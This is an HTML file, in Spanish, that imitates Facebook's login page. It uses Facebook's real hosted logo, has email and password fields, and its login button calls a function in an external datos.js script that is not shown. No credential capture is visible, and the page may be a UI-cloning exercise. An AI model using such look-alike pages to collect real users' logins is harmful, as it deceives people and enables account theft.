<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Inicia sesión o registrarte</title>
    <link rel="stylesheet" href="css/estilos-facebook.css">
   
</head>
<body>
    <div class="contenedor">
        <div class="col1">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="" class="logo">
            <p>Facebook te ayuda a comunicarte y compartir con la personas que forman parte de tu vida</p>
        </div>
        <div class="col2">
            <form action="">
                <input type="text" name="correonum" id="correonum" placeholder="Correo electrónico o número de teléfono" size="100">
                <input type="password" placeholder="Contraseña">
                <a href="#" class="iniciar" onclick="iniciar()">Iniciar sesión</a>
                <a href="#" class="olvidaste">¿Olvidaste la contraseña</a>
                <hr>
                <a href="#" class="nueva">Crear cuenta nueva</a>
            </form>
            <p><strong>Crear una páguina</strong> para una celebridad, una marca o un negocio</p>

        </div>
    </div>
    <script type="text/javascript" src="datos.js"></script>
</body>
</html>
